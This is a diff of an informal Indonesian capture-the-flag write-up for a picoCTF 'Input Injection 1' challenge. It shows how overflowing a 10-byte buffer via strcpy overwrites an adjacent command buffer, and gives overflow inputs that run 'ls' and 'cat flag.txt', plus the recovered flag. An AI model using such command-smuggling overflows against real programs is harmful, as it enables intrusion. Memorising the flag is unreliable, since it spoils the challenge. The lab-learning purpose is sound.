@@ -1,4 +1,4 @@
-
+<img width="1358" height="683" alt="image" src="https://github.com/user-attachments/assets/343ddf76-3fb7-4bdd-9f7f-25066f7ada44" />
 
 ## Info Challenge
 **Challenge:** Input Injection 1  
@@ -7,7 +7,7 @@
 
 ## Solusi
 
-### 1. Analisis Kode
+### 1. buka sc nya dulu yg dikasih
 
 
 ```c
@@ -23,9 +23,9 @@ void fun(char *name, char *cmd) {
 }
 ```
 
-**vuln ketemu tuh:** buffer overflow di `strcpy(buffer, name)`. karena `c` dan `buffer` mereka bersebelahan, overflow atau kelebihan pada `buffer` bisa menimpa `c` jadi intinya kalo kita input nama dan kelebihan kita bisa akses c .
+**vuln ketemu tuh:** buffer overflow di `strcpy(buffer, name)`. karena c dan buffer mereka bersebelahan, overflow pada `buffer` bisa menimpa `c` jadi intinya kalo kita input nama dan kelebihan kita bisa akses c .
 
-### 2. Testing Program
+### 2. tes program 
 Coba konek normal:
 ```
 $ nc amiable-citadel.picoctf.net 57507
@@ -36,42 +36,50 @@ Linux
 ```
 aman saja disini berfungsi denhan baik
 
-### 3. Cari Panjang Overflow
-Kita perlu overflow `buffer[10]` ke `c[10]` perlu mengisi:
+### 3. cari panjang overflownya brp 
+ perlu overflow `buffer[10]` ke `c[10]` perlu mengisi:
 - `buffer[10]` penuh (10 bytes)
-- Plus cukup untuk timpa "uname" di `c`
+- plus cukup untuk timpa "uname" di `c`
 
-Coba dengan 10 'A':
+aku coba dengan 10 'A':
 ```
 AAAAAAAAAA
 Goodbye, AAAAAAAAAA!
 Linux  # masih "uname"
 ```
 
-### 4. Exploit
-Coba overflow dengan command baru setelah 10 'A':
+### 4. kita eksekusi
+coba overflow dengan cmd baru abis 10 'A':
 ```
 AAAAAAAAAAls
 ```
-Hasil:
+hmmm hasilnya:
 ```
 Goodbye, AAAAAAAAAAls!
 flag.txt
 vuln
 vuln.c
 ```
-Berhasil! Buffer `c` sekarang berisi "ls" bukan "uname".
 
-### 5. Dapatkan Flag
-Ganti "ls" dengan "cat flag.txt":
+### 5. dapetin flag 
+ganti "ls" dengan "cat flag.txt":
 ```
 AAAAAAAAAAcat flag.txt
 ```
-Hasil:
+hasil:
 ```
 Goodbye, AAAAAAAAAAcat flag.txt!
-
+picoCTF{0v3rfl0w_c0mm4nd_d3eb7161} 
 ```
 
-## Flag
+## flag
 `flag`
+picoCTF{0v3rfl0w_c0mm4nd_d3eb7161} 
+![Uploading Screenshot 2025-12-13 145522.png…]()
+
+
+
+<img width="1358" height="683" alt="Screenshot 2025-12-13 145554" src="https://github.com/user-attachments/assets/5dcef757-0ada-40d2-ad15-5788c4657175" />
+
+
+
